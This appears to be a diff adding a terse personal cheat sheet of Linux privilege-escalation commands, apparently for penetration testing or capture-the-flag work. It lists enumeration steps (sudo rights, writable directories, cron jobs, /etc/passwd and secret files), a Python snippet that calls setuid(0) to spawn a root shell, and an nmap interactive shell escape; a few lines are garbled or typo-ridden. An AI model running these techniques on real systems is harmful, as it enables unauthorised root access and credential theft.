@@ -1,0 +1,57 @@
+useful commands
+sudo -l
+* sometimes www-data is written in sudoer's file, 
+* then you can use ../../../../../../bin/bash
+​
+sudo -V
+uname -a
+​
+(look for world writable)
+(NOT root root, root shadow, root cups)
+/var/tmp
+/tmp
+/usr/tmp
+/dev/shm
+/dev/msqueue
+/opt
+/var/
+/var/spool/
+/var/mail
+#rootfs
+/var/www
+
+find / -maxdepth 3 -type d -per -777
+
+ls -lsa /etc/ |grep -i '.secret'
+
+(any cron jobs going on?)
+crontab -l
+ls -lsaht /etc/cron.*
+
+(is passwd writable?)
+ls -lsa /etc/passwd
+
+(look for extended mount options, e.g. /bin/sh/*)
+cat /etc/fstab
+
+(any unmounted systems?)
+mount
+
+(root or extended capabilities for binaries)
+Pretty normal /var/lib example
+
+SUID examples
+python2.7 ==> allows "verify = false", therefore the following script works
+vim shell.py
+
+import os
+os.setuid(0)
+os.system("/bin/dash")
+
+
+
+☐ ===Other, misc=== ☐  ☐
+nmap --interactive
+nmap> !sh
+Reference
+https://www.baeldung.com/linux/fully-open-directories
